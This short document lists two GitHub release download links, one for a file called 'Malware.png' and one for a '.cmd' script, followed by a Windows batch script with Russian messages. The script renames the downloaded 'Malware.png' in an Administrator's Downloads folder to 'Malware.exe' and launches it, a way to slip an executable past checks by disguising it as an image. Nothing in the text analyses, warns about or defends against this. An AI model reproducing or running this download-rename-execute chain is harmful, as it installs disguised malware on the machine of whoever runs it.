https://github.com/TESSERACT-cody/remote-uploader-files/releases/latest/download/Malware.png


https://github.com/TESSERACT-cody/my-python/releases/latest/download/system.code.cmd 



@echo off
chcp 65001 >nul
set "SOURCE=C:\Users\Администратор\Downloads\Malware.png"
set "TARGET=C:\Users\Администратор\Downloads\Malware.exe"

if exist "%SOURCE%" (
    ren "%SOURCE%" "Malware.exe"
    if exist "%TARGET%" (
        start "" "%TARGET%"
    ) else (
        echo Не удалось переименовать файл.
    )
) else (
    echo Исходный файл не найден: %SOURCE%
)
